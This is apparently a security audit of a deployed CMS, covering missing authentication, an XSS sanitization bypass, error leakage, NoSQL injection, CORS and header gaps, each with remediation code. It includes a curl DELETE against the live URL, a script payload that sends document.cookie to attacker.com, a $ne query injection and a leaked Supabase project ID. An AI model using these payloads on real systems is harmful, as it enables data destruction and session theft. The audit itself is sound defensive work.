# Application Security Audit & Vulnerability Assessment — o8m Giakaa CMS

**Target:** o8m Giakaa CMS (Full-Stack Repository + Live API)  
**Security Standard:** OWASP Top 10 (2021) / ASVS Level 1  
**Audit Date:** November 16, 2026  
**Auditor:** Application Security Engineer  

---

## 1. Executive Security Summary

The application exhibits critical architectural vulnerabilities. While the repository contains code for client-side XSS sanitization (`DOMPurify`) and initial creation sanitization (`sanitize-html`), **the system completely lacks an authentication and authorization layer**.

Any anonymous user on the public internet can create, modify, publish, unpublish, or permanently delete all hero slides and blog articles via direct HTTP requests. Furthermore, backend XSS sanitization is completely bypassed on blog updates, and database operational errors leak internal infrastructure names.

---

## 2. Security Severity Matrix

| Finding ID | Title | Severity | CVSS v3.1 | OWASP Top 10 | Status |
| :--- | :--- | :---: | :---: | :--- | :---: |
| **SEC-01** | Total Absence of Authentication on Administrative APIs | **CRITICAL** | **9.8** | A01:2021 - Broken Access Control | Confirmed |
| **SEC-02** | Backend XSS Sanitization Bypass via Query Update Methods | **HIGH** | **7.4** | A03:2021 - Injection | Confirmed |
| **SEC-03** | Sensitive Infrastructure Information Disclosure in API Errors | **HIGH** | **7.5** | A05:2021 - Security Misconfiguration | Confirmed |
| **SEC-04** | NoSQL Operator Injection via Unsanitized Query Parameters | **MEDIUM** | **6.5** | A03:2021 - Injection | Confirmed |
| **SEC-05** | Overly Permissive Cross-Origin Resource Sharing (CORS) | **MEDIUM** | **5.3** | A07:2021 - Identification & Auth Failures | Confirmed |
| **SEC-06** | Missing Security Response Headers (No Helmet Middleware) | **MEDIUM** | **5.3** | A05:2021 - Security Misconfiguration | Confirmed |
| **SEC-07** | Information Disclosure: Public Exposure of Draft Blog Posts | **MEDIUM** | **5.3** | A01:2021 - Broken Access Control | Confirmed |
| **SEC-08** | Client-Side JavaScript Protocol Execution in `ctaLink` | **LOW** | **3.8** | A03:2021 - Injection | Confirmed |

---

## 3. In-Depth Vulnerability Analysis

### 3.1 SEC-01: Total Absence of Authentication on Administrative APIs
* **Vulnerability Type:** CWE-306: Missing Authentication for Critical Function
* **Affected Files:**
  - `backend/routes/heroRoutes.js` (Lines 19, 31, 46)
  - `backend/routes/blogRoutes.js` (Lines 34, 45, 66)
  - `frontend/src/App.jsx` (Line 22)
* **Evidence:**
  In `backend/routes/blogRoutes.js`:
  ```javascript
  // No auth middleware exists on these mutating routes:
  router.post('/', async (req, res) => { ... });
  router.put('/:id', async (req, res) => { ... });
  router.delete('/:id', async (req, res) => { ... });
  ```
* **Reproduction Steps:**
  1. Open a terminal without tokens, cookies, or credentials.
  2. Execute:
     ```bash
     curl -X DELETE https://o8m-giakaa-cms.onrender.com/api/blogs/67a998b3c3e218206d2524a1
     ```
  3. If the database is connected, the resource is deleted immediately.
* **Risk & Impact:** Malicious actors or automated crawlers can wipe the entire content catalog or inject defacing content into production.
* **Remediation:**
  1. Implement JWT or secure session cookie authentication (`express-session` with `httpOnly`, `secure`, `sameSite`).
  2. Add an authentication middleware `protect` to all mutating routes:
     ```javascript
     const { protect } = require('../middleware/auth');
     router.post('/', protect, createBlog);
     router.put('/:id', protect, updateBlog);
     router.delete('/:id', protect, deleteBlog);
     ```

---

### 3.2 SEC-02: Backend XSS Sanitization Bypass on Blog Updates
* **Vulnerability Type:** CWE-79: Improper Neutralization of Input During Web Page Generation
* **Affected Files:**
  - `backend/routes/blogRoutes.js` (Lines 53-56)
  - `backend/models/Blog.js` (Lines 45-59)
* **Evidence:**
  In `Blog.js`:
  ```javascript
  BlogSchema.pre('save', function (next) {
    if (this.content) {
      this.content = sanitizeHtml(this.content, { ... });
    }
    next();
  });
  ```
  In `blogRoutes.js`:
  ```javascript
  router.put('/:id', async (req, res) => {
    let blog = await Blog.findById(req.params.id);
    blog = await Blog.findByIdAndUpdate(req.params.id, req.body, {
        new: true,
        runValidators: true
    });
    res.status(200).json({ success: true, data: blog });
  });
  ```
* **Mechanism of Failure:** In Mongoose, `findByIdAndUpdate` is a query-level update (`Query.prototype.findOneAndUpdate`). It bypasses all document-level middleware (`pre('save')`).
* **Test Case / Exploit Payload:**
  Submitting a `PUT` request with payload:
  ```json
  {
    "content": "<p>Legitimate content</p><script>fetch('https://attacker.com/steal?c='+document.cookie)</script><img src=x onerror=alert(1)>"
  }
  ```
  The script payload bypasses `sanitize-html` and is stored raw in the MongoDB database.
* **Remediation:**
  Refactor `PUT /api/blogs/:id` to mutate the document instance and invoke `.save()`:
  ```javascript
  router.put('/:id', async (req, res) => {
    const blog = await Blog.findById(req.params.id);
    if (!blog) return res.status(404).json({ success: false, error: 'Not found' });
    
    Object.assign(blog, req.body);
    await blog.save(); // Triggers pre('save') sanitization and slugification
    res.status(200).json({ success: true, data: blog });
  });
  ```

---

### 3.3 SEC-03: Sensitive Infrastructure Information Disclosure in API Errors
* **Vulnerability Type:** CWE-209: Generation of Error Message Containing Sensitive Information
* **Affected Files:**
  - `backend/routes/heroRoutes.js`
  - `backend/routes/blogRoutes.js`
* **Evidence:**
  Probing the live deployed Render API:
  ```bash
  curl -s https://o8m-giakaa-cms.onrender.com/api/hero
  ```
  Returns:
  ```json
  {
    "success": false,
    "error": "(ENOTFOUND) tenant/user postgres.tkombxcbkwydtlvknarn not found"
  }
  ```
* **Risk & Impact:** Leaks the exact internal Supabase project ID (`tkombxcbkwydtlvknarn`) and backend architecture topology, enabling targeted reconnaissance.
* **Remediation:**
  Implement a central error-handling middleware that sanitizes error messages in production:
  ```javascript
  app.use((err, req, res, next) => {
    const isDev = process.env.NODE_ENV === 'development';
    res.status(err.status || 500).json({
      success: false,
      error: isDev ? err.message : 'Internal Server Error'
    });
  });
  ```

---

### 3.4 SEC-04: Potential NoSQL Operator Injection
* **Vulnerability Type:** CWE-943: Improper Neutralization of Special Elements used in an SQL/NoSQL Command
* **Affected Files:** `backend/routes/blogRoutes.js` (Lines 9-11)
* **Evidence:**
  ```javascript
  const { status } = req.query;
  const filter = status ? { status } : {};
  const blogs = await Blog.find(filter).sort({ createdAt: -1 });
  ```
* **Mechanism of Failure:** When parsed by Express's query parser, nested objects like `?status[$ne]=null` turn `req.query.status` into `{ '$ne': null }`. `Blog.find({ status: { $ne: null } })` circumvents status filtering and returns all records regardless of status.
* **Remediation:**
  Sanitize or cast `status` explicitly to a string, or use an allowlist:
  ```javascript
  const allowedStatuses = ['published', 'draft'];
  const filter = allowedStatuses.includes(req.query.status)
    ? { status: req.query.status }
    : { status: 'published' };
  ```

---

### 3.5 SEC-05: Overly Permissive Cross-Origin Resource Sharing (CORS)
* **Vulnerability Type:** CWE-942: Permissive Cross-domain Policy with Untrusted Domains
* **Affected File:** `backend/server.js` (Line 21)
* **Evidence:**
  ```javascript
  // Enable CORS
  app.use(cors());
  ```
* **Remediation:**
  Restrict CORS origins to the authorized frontend domain:
  ```javascript
  const allowedOrigins = [process.env.FRONTEND_URL || 'http://localhost:5173'];
  app.use(cors({
    origin: (origin, callback) => {
      if (!origin || allowedOrigins.includes(origin)) callback(null, true);
      else callback(new Error('Not allowed by CORS'));
    },
    credentials: true
  }));
  ```

---

### 3.6 SEC-06: Missing Security Response Headers
* **Vulnerability Type:** CWE-1021: Improper Restriction of Rendered UI Layers or MIME Sniffing
* **Affected File:** `backend/server.js`
* **Evidence:**
  Inspection of response headers shows absence of `helmet`:
  - Missing `Content-Security-Policy`
  - Missing `X-Content-Type-Options: nosniff`
  - Missing `X-Frame-Options: DENY`
  - Missing `Strict-Transport-Security` (HSTS)
* **Remediation:**
  Install and mount `helmet`:
  ```javascript
  const helmet = require('helmet');
  app.use(helmet());
  ```

---

### 3.7 SEC-07: Public Exposure of Draft Blog Posts
* **Vulnerability Type:** CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
* **Affected Files:** `backend/routes/blogRoutes.js` (Lines 7-30)
* **Evidence:**
  1. `GET /api/blogs` without `?status=` parameter returns drafts.
  2. `GET /api/blogs/:slug` executes `Blog.findOne({ slug: req.params.slug })` with no status check.
* **Remediation:**
  Enforce `{ status: 'published' }` on public catalog and slug endpoints. Require admin authentication for querying drafts.
